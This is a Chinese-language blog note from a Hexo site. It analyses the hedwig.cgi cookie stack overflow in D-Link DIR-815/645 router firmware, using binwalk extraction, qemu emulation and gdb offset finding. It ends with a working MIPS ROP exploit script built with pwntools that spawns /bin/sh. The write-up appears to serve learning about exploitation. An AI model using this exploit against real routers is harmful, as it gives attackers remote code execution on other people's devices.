@@ -1,0 +1,574 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>D-Link DIR-815（/300/600/645) 路由器多次溢出漏洞分析 | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="固件下载地址：https://rebyte.me/en/d-link/89510/file-592084/ （这是815，我用的645）POC：https://www.exploit-db.com/exploits/33863从poc可以看出漏洞存在于hedwig.cgi文件中，通过这个脚本传递一个超长cookie导致栈溢出。  固件提取123456$ unzip DIR645A1_FW103B">
+<meta name="keywords" content="笔记,iot,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D-Link DIR-815（&#x2F;300&#x2F;600&#x2F;645) 路由器多次溢出漏洞分析">
+<meta property="og:url" content="p1Kk.github.io/2020/09/10/路由器/D-Link DIR-815 路由器多次溢出漏洞分析（645)/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="固件下载地址：https://rebyte.me/en/d-link/89510/file-592084/ （这是815，我用的645）POC：https://www.exploit-db.com/exploits/33863从poc可以看出漏洞存在于hedwig.cgi文件中，通过这个脚本传递一个超长cookie导致栈溢出。  固件提取123456$ unzip DIR645A1_FW103B">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/cookie.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/20200428083701.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/155.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/tmp.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/mowei.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/systemaddr.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/mipsget.png">
+<meta property="og:updated_time" content="2020-07-05T06:53:25.293Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="D-Link DIR-815（&#x2F;300&#x2F;600&#x2F;645) 路由器多次溢出漏洞分析">
+<meta name="twitter:description" content="固件下载地址：https://rebyte.me/en/d-link/89510/file-592084/ （这是815，我用的645）POC：https://www.exploit-db.com/exploits/33863从poc可以看出漏洞存在于hedwig.cgi文件中，通过这个脚本传递一个超长cookie导致栈溢出。  固件提取123456$ unzip DIR645A1_FW103B">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/cookie.png">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	
+	  <article itemprop="articleBody"> 
+		  <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2020/09/10/路由器/D-Link DIR-815 路由器多次溢出漏洞分析（645)/" title="D-Link DIR-815（/300/600/645) 路由器多次溢出漏洞分析" itemprop="url">D-Link DIR-815（/300/600/645) 路由器多次溢出漏洞分析</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2020-09-10T01:56:43.208Z" itemprop="datePublished"> Published 2020-09-10</time>
+    
+  </p>
+</header>
+	  <div class="article-content">
+		  
+		  <div id="toc" class="toc-article">
+			  <strong class="toc-title">Contents</strong>
+		  
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#固件提取"><span class="toc-number">1.</span> <span class="toc-text">固件提取</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li></ol>
+		  
+		  </div>
+		  
+		  <blockquote>
+<p>固件下载地址：<a href="https://rebyte.me/en/d-link/89510/file-592084/" target="_blank" rel="noopener">https://rebyte.me/en/d-link/89510/file-592084/</a> （这是815，我用的645）<br>POC：<a href="https://www.exploit-db.com/exploits/33863" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/33863</a><br>从poc可以看出漏洞存在于<code>hedwig.cgi</code>文件中，通过这个脚本传递一个超长cookie导致栈溢出。</p>
+</blockquote>
+<h1 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ unzip DIR645A1_FW103B11.zip</span><br><span class="line">$ binwalk -Me DIR645A1_FW103B11.bin</span><br><span class="line"></span><br><span class="line">$ cd _DIR645A1_FW103B11.bin.extracted/</span><br><span class="line">$ sudo find ./ -name hedwig.cgi</span><br><span class="line">./squashfs-root/htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure>
+
+<p>到目标文件夹下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l ./hedwig.cgi </span><br><span class="line">lrwxrwxrwx 1 kk kk 14 Apr 27 02:14 ./hedwig.cgi -&gt; /htdocs/cgibin</span><br><span class="line">OR</span><br><span class="line">$ file hedwig.cgi </span><br><span class="line">hedwig.cgi: broken symbolic link to /htdocs/cgibin</span><br></pre></td></tr></table></figure>
+
+<p><code>hedwig.cgi</code>是一个指向<code>/htdocs/cgibin</code>的符号链接，所以我们用ida分析一下<code>cgibin</code></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>直接查找字符串<code>HTTP_COOKIE</code>，有两处引用。<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/cookie.png" alt></p>
+<p>查看这两个part，在hedwigcgi_main函数中发现危险函数sprintf<br>且cookie要以<code>uid=···</code>的形式才能被接收<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/20200428083701.png" alt><br>但是还不确定是不是由此导致的溢出，进行测试…【初学踩坑，一定要将qemu放入<code>squashfs-root</code>目录下，记得选择好qemu类型】<br>否则会出现一下问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">没有在squashfs-root目录下：</span><br><span class="line">/lib/ld-uClibc.so.0: No such file or directory</span><br><span class="line">-------------------------------------------------</span><br><span class="line">qemu-mips/mipsel选择错误：</span><br><span class="line">./cgibin: Invalid ELF image for this architecture</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp $(which qemu-mipsel-static) ./</span><br></pre></td></tr></table></figure>
+
+<p>然后附加调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=20 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=`python -c &quot;print &apos;uid=123&apos;+&apos;A&apos;*0x600&quot;` -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;0.0.0.0&quot; -g 1234 ./htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure>
+
+<p>pwndbg</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set architecture mips</span><br><span class="line"></span><br><span class="line">pwndbg&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>
+
+<p>出现溢出<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/155.jpg" alt></p>
+<p>会报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;</span><br></pre></td></tr></table></figure>
+
+<p>错误原因是程序需要打开某tmp文件，但是我们没有这个文件。<br>真实的路由环境中是否有这个目录，会导致模拟和现实中漏洞利用存在差异，导致模拟成功而现实中却失败，我们通过打开成功或失败后执行结果的差异性来判断真实路由器中是否存在该目录。<br>刚才是没有tmp目录的情况，所以我们手动创建一个<code>/var/tmp</code>目录，再次测试。如果成功打开tmp文件，在IDA查看程序流执行到最后还是会有sprintf危险函数。（不知道是我创建的不对还是咋的…❗❓❓❓还是会报错，不过实际上确实存在<code>/var/tmp</code>）<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/tmp.png" alt><br>故两处漏洞真正有效的是第二次溢出。</p>
+<p>所以将输入改很大进行测试(<code>cyclic 1500</code>)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=20 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=`python -c &quot;print &apos;uid=123&apos;+&apos;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaao&apos;&quot;` -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;0.0.0.0&quot; -g 1234 ./htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6b61616b</span><br><span class="line">1040</span><br></pre></td></tr></table></figure>
+
+<p>找到了偏移<br>使用ROP，首先找到libc基地址，gdb中通过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br><span class="line">或</span><br><span class="line">i proc mappings [进程号]</span><br></pre></td></tr></table></figure>
+
+<p>但是我这些都有问题….找不到，但是先继续往下做吧</p>
+<p>在问题函数<code>hedwigcgi_main</code>的最后<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/mowei.png" alt><br>可以看出整个栈空间寄存器的位置，以此来进行构造。<br>我们希望调用<code>system(&quot;/bin/sh&quot;)</code>，所以首先需要找到system函数，将libc.so文件加载入IDA，找到system地址。<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/systemaddr.png" alt><br>寻找gadget来构造调用system，用到了<strong>mipsrop</strong>，启用mipsrop后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinders()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0000B814  |  addiu $a1,$sp,0x168+var_150                         |  jalr  $s1                             |</span><br><span class="line">|  0x0000B830  |  addiu $a1,$sp,0x168+var_B0                          |  jalr  $s1                             |</span><br><span class="line">|  0x0000DEF0  |  addiu $s2,$sp,0xC8+var_B8                           |  jalr  $s4                             |</span><br><span class="line">|  0x00013F74  |  addiu $s1,$sp,0x50+var_38                           |  jalr  $s4                             |</span><br><span class="line">|  0x00014F28  |  addiu $s1,$sp,0x50+var_38                           |  jalr  $s4                             |</span><br><span class="line">|  0x000159CC  |  addiu $s5,$sp,0x170+var_160                         |  jalr  $s0                             |</span><br><span class="line">|  0x00015B6C  |  addiu $s2,$sp,0x2A8+var_290                         |  jalr  $s0                             |</span><br><span class="line">.........................</span><br></pre></td></tr></table></figure>
+
+<p>查看过后，发现<code>0x000159CC</code>处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">【rop1】</span><br><span class="line">.text:000159CC                 addiu   $s5, $sp, 0x170+var_160</span><br><span class="line">.text:000159D0                 move    $a1, $s3</span><br><span class="line">.text:000159D4                 move    $a2, $s1</span><br><span class="line">.text:000159D8                 move    $t9, $s0</span><br><span class="line">.text:000159DC                 jalr    $t9 ; mempcpy</span><br><span class="line">.text:000159E0                 move    $a0, $s5</span><br></pre></td></tr></table></figure>
+
+<p>可以通过<code>&quot;/bin/sh&quot; -&gt; $sp -&gt; $s5 -&gt; $a0</code><br><code>system+base_addr -&gt; $s0 -&gt; $t9</code>实现<br>因为漏洞在<code>sprintf</code>时，它会因为00截断，而我们的system地址存在\x00坏字符，我们可以通过先将地址-1避免坏字符，再通过gadget+1操作恢复，继续查找让 $s0+1 的操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.find(&quot;addiu $s0,1&quot;)</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x000158C8  |  addiu $s0,1                                         |  jalr  $s5                             |</span><br><span class="line">|  0x000158D0  |  addiu $s0,1                                         |  jalr  $s5                             |</span><br><span class="line">|  0x0002374C  |  addiu $s0,1                                         |  jalr  $fp                             |</span><br><span class="line">..........................</span><br></pre></td></tr></table></figure>
+
+<p>第一个就非常符合我们的操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【rop2】</span><br><span class="line">.text:000158C8                 move    $t9, $s5</span><br><span class="line">.text:000158CC                 jalr    $t9</span><br><span class="line">.text:000158D0                 addiu   $s0, 1</span><br></pre></td></tr></table></figure>
+
+<p>首先控制好<code>$s0</code>为system-1，<code>$s5</code>为rop1，然后控制<code>$ra</code>为rop2，跳转进入后会跳转到<code>$s5-&gt;$t9</code>即rop1，同时<code>$s0+1</code>，即还原system地址，rop1执行system</p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;little&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line"></span><br><span class="line"># base_addr = 0x767e9000</span><br><span class="line">base_addr = 0x76738000</span><br><span class="line">system_addr = base_addr + 0x53200</span><br><span class="line">rop1 = base_addr + 0x159CC 		# addiu $s5,$sp,0x170+var_160 | jalr $s0 |</span><br><span class="line">rop2 = base_addr + 0x158C8 		# addiu $s0,1 				  | jalr $s5 |</span><br><span class="line"></span><br><span class="line">padding = &apos;uid=&apos; + &apos;a&apos; * 1007	# 1040+3-4*9</span><br><span class="line">padding += p32(system_addr-1)	# s0       </span><br><span class="line">padding += &apos;a&apos; * 4				# s1</span><br><span class="line">padding += &apos;a&apos; * 4				# s2</span><br><span class="line">padding += &apos;a&apos; * 4				# s3</span><br><span class="line">padding += &apos;a&apos; * 4				# s4</span><br><span class="line">padding += p32(rop1)			# s5</span><br><span class="line">padding += &apos;a&apos; * 4				# s6</span><br><span class="line">padding += &apos;a&apos; * 4				# s7</span><br><span class="line">padding += &apos;a&apos; * 4				# fd</span><br><span class="line">padding += p32(rop2)			# ra       </span><br><span class="line">padding += &apos;a&apos; * 0x10</span><br><span class="line">padding += &apos;/bin//sh&apos;</span><br><span class="line"></span><br><span class="line">with open(&quot;payload&quot;,&apos;wb&apos;) as f:</span><br><span class="line">    f.write(padding)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python exp.py</span><br><span class="line">$ sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=20 </span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$(&lt;payload) -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;0.0.0.0&quot; -g 1234 ./htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/mipsget.png" alt></p>
+<blockquote>
+<p>参考:<br><a href="https://ray-cp.github.io/archivers/router_vuln_book_note#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/router_vuln_book_note#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a><br><a href="https://xz.aliyun.com/t/6808#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6808#toc-8</a></p>
+</blockquote>
+  
+	  </div>
+		  <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/笔记/">笔记</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/笔记/">笔记</a><a href="/tags/iot/">iot</a><a href="/tags/栈溢出/">栈溢出</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	  </article>
+	  
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2020/09/10/整数溢出/整数溢出/" title="整数溢出">
+  <span>
+  整数溢出</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2020/09/10/tw/tw/"  title="pwnable.tw start orw wp">
+ <span>pwnable.tw start orw wp
+</span>
+</a>
+</div>
+
+</nav>
+
+	  
+
+</div> 
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/ACM/" title="ACM">ACM<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>22</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>21</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/面经/" title="面经">面经<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>38</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>26</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tw/" title="tw">tw<sup>18</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>17</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆/" title="堆">堆<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/iot/" title="iot">iot<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈/" title="栈">栈<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈溢出/" title="栈溢出">栈溢出<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/环境搭建/" title="环境搭建">环境搭建<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IO/" title="IO">IO<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/面经/" title="面经">面经<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/C/" title="C++">C++<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java/" title="java">java<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/HDU/" title="HDU">HDU<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://whali3n51.github.io" target="_blank" title="whali3n51">whali3n51</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+
+	<p class="copyright">
+	Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2020 
+	
+	<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+	
+	
+	</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
